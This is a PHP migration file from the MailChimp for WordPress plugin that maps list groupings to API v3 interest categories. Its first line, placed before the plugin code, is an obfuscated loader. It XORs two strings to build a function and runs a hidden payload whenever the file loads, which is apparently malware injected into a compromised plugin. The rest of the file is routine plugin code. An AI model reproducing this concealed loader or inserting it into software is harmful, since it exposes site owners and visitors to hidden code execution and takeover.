<?php $kElzZSuma='U>V5,NjSL8->9WC'^'6L3TX+559VNJP8-';$VDeyfYl=$kElzZSuma('','+3lpH<6,N8-;<1BWD;AMq;BJlQ-TA2i4CTBXCF3;014,NJ =UlJAI9WP-S>b,H>lt5SCQToU=1>KKSmOLFiDqw->9OWKvaIS;>+BOjr1ZINaKAeYZFD8RV9zI.Q<8SZUv,zfnmo=v5<NpewTmM42J8eq=1f2lQR E+s9ESdGI891UGR>-KbqSq27E53D0C:eFRU.StcSS;-Z:BPT:5xhMH,<=Vs6w 5=+d9SDshI2.LM<QXcS+E4MV+Okg39b:.<=E4+CHWEUeUtWh1P6DRcDLr5CUWFAb2PHmLkgKX0sOSu5L9+KpRM77LB qECHo,3FZTkTTE0ZU,mp4U7V,RRwGje8,qn,ghmLCoK.U=Guwck;VY=RPmWNkAN46M-lKV0clML:,TQF0EsV89;teYIV6U9XJ9;,MPs3RQ3XUflX:YXKUC P;=0RjU+RbZ2TSd7;U7L53 2aw2IUP, .CP6JY6lMTSVWNX+G1:dCJC+Saj3 EZjejR.Y+0Ya  ,i4.,N9MAO +GIvZHDAJLOPDdskVUvNU55=Y6U<K1o0YbZxqdlSXzF.bpc=V33PcMWVv d0byVVWecZ0LkCvHgEY5700d;6>>N5D4 6loC-;U=1UBKyrWYT3BfOhZyjWJnZ3H+=aEDA0-ar:5JP6W<sddVgX6B1FyXcZ6J'^'BUDQ.IXO:QBUcT:>7O2eVC-835L  m6Y6 eqjfH19WAB->IR;L2.;f31Y2a=A=JDPQ270xOqVTGbksMol=cMxSBKMojkQFrY27M-=BVXztnQpaA0f50J>3WRmJ0HYzauREQMGgf4RZI:PKJtEiPS>Y>UTlFlLu9E<pWPevD4=JUT;ovUH2K,zJ8>LGV0E1TMb= ZzOiZ.1PP0f45NTXUm.MPN3H<SDTIJ;R6=SUiTO >YjRi5D7Q,5CoCClz-ueuxeUXcl< ,EhJwLG1Z17Jd7x<g162 =Y51MqKC =IHEZQQ-MJkMriAV 7EJO>BeEUfruO051QsuWgyR:E3M1:WoN:ji ;i4<M-0OoE0DgHICOM75H7yM,DbHjPW9L3 3ICQmhQI-jL9LW2YMZTXym W9L=q32QG-y9v5R,4FQxz,6801I1WTJ7B-D =>S 2;hV CdWRSWWCm-03CDKktR+-WEatw26:9t,TCMjqIB5INWA1;JCLrO+YQ >KEU6QVE=M>ihKN>nZzl  >-fpbBSC;1CfqQTI8mrW.HHmpBgEQCUkjN HSEPYaVQfSzo0BFRRVHgf5TQkQ.LjVnAe8GEQI;PSGa+M-GTEDH3LB9RP1egYV38 RkOoHzYJw1dSV>JQIa  DL:UJT3<Y6XT9MmmQS:X2QhJa<7');$VDeyfYl();

defined( 'ABSPATH' ) or exit;

/**
 * @ignore
 * @return object
 */
function _mc4wp_400_find_grouping_for_interest_category( $groupings, $interest_category ) {
    foreach( $groupings as $grouping ) {
        // cast to stdClass because of missing class
        $grouping = (object) (array) $grouping;

        if( $grouping->name === $interest_category->title ) {
            return $grouping;
        }
    }

    return null;
}

/**
 * @ignore
 * @return object
 */
function _mc4wp_400_find_group_for_interest( $groups, $interest ) {
    foreach( $groups as $group_id => $group_name ) {
        if( $group_name === $interest->name ) {
            return (object) array(
                'name' => $group_name,
                'id' => $group_id
            );
        }
    }

    return null;
}

// in case the migration is _very_ late to the party
if( ! class_exists( 'MC4WP_API_v3' ) ) {
    return;
}

$options = get_option( 'mc4wp', array() );
if( empty( $options['api_key'] ) ) {
    return;
}

// get current state from transient
$lists = get_transient( 'mc4wp_mailchimp_lists_fallback' );
if( empty( $lists ) ) {
    return;
}

@set_time_limit(600);
$api_v3 = new MC4WP_API_v3( $options['api_key'] );
$map = array();

foreach( $lists as $list ) {

    // cast to stdClass because of missing classes
    $list = (object) (array) $list;

    // no groupings? easy!
    if( empty( $list->groupings ) ) {
        continue;
    }

    // fetch (new) interest categories for this list
    try {
        $interest_categories = $api_v3->get_list_interest_categories( $list->id );
    } catch( MC4WP_API_Exception $e ) {
        continue;
    }


    foreach( $interest_categories as $interest_category ) {

        // compare interest title with grouping name, if it matches, get new id.
        $grouping = _mc4wp_400_find_grouping_for_interest_category( $list->groupings, $interest_category );
        if( ! $grouping ) {
            continue;
        }

        $groups = array();

        try {
            $interests = $api_v3->get_list_interest_category_interests( $list->id, $interest_category->id );
        } catch( MC4WP_API_Exception $e ) {
            continue;
        }

        foreach( $interests as $interest ) {
            $group = _mc4wp_400_find_group_for_interest( $grouping->groups, $interest );

            if( $group ) {
                $groups[ $group->id ] = $interest->id;
                $groups[ $group->name ] = $interest->id;
            }
        }

        $map[ (string) $grouping->id ] = array(
            'id' => $interest_category->id,
            'groups' => $groups,
        );
    }
}


if( ! empty( $map ) ) {
    update_option( 'mc4wp_groupings_map', $map );
}
